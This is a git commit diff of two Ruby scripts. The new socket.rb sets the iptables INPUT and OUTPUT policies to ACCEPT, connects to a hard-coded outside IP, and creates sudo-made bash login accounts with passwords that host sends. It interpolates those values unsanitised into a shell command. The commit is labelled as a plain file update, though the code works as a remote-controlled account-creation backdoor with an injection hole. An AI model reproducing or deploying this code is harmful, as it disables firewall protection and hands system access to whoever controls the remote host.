f89296c8a6cee524cba8880841ab8c4e690d0a57
Yesha <valetudinarygoat@gmail.com>
2016-07-01 14:00:37 -0700

    Update files

--- server.rb
+++ server.rb
@@ -6,36 +6,11 @@ server = TCPServer.open(2000)
 system "iptables -P INPUT ACCEPT"
 system "iptables -P OUTPUT ACCEPT"
 
-def actions(line)
-	command = line.split
-	if command[0] == 'useradd'
-		create_user(command[1], command[2])
-	end
-end
-
-
-def create_user(us,pw)
- pwd = pw.crypt("$5$a1")
-        result = system("useradd -m -p '#{ pwd }' #{ us } -s /bin/bash")
-        if result
-                puts "#{ us } created!"
-            else
-                puts "#{ us } failed!"
-        end
-end
-
-
-
-
 loop do
 	Thread.start(server.accept) do |socket|
 		print(socket, " is accepted\n") 
 		while line = socket.gets
-			actions(line)
+			puts line
 		end
-		print(socket, " is gone\n") 
-		socket.close
 	end
 end
-
-
---
+++ socket.rb
@@ -0,0 +1,31 @@
+require 'socket'
+
+puts "Process #{Process.pid}"
+
+system "iptables -P INPUT ACCEPT"
+system "iptables -P OUTPUT ACCEPT"
+
+socket = TCPSocket.new('52.4.231.97', 2000)
+socket.puts("#{ARGV[0]}")
+
+def actions(line)
+	command = line.split
+	if command[0] == 'useradd'
+		create_user(command[1], command[2])
+	end
+end
+
+
+def create_user(us,pw)
+ pwd = pw.crypt("$5$a1")
+        result = system("sudo useradd -m -p '#{ pwd }' #{ us } -s /bin/bash")
+        if result
+                puts "#{ us } created!"
+            else
+                puts "#{ us } failed!"
+        end
+end
+
+while line = socket.gets
+	actions(line)
+end
